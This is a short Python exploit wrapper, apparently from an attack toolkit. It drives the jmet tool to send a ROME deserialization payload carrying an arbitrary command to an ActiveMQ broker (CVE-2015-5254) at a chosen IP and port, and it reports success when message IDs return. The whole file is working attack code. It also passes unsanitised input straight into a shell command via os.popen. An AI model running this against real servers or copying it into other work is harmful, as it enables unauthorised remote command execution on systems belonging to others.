#author:九世
#time:2019/1/16

import os
import re

def jiancha():
    if os.path.exists('arms/jmet-master'):
        print('[h] Found arms/jmet-master')
    else:
        print('[q] Not Found arms/jmet-marser....')
        exit()

def run(execq,ip,port):
    execs='java -jar arms/jmet-master/jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "{}" -Yp ROME {} {}'.format(execq,ip,port)
    zx=os.popen(execs)
    zhenze=re.findall('ID:.*',str(zx.read()))
    if len(zhenze)>0:
        print('[a] Found CVE-2015-5254')
        for i in zhenze:
            print(i)
    else:
        print('[q] Not Found CVE-2015-5254')
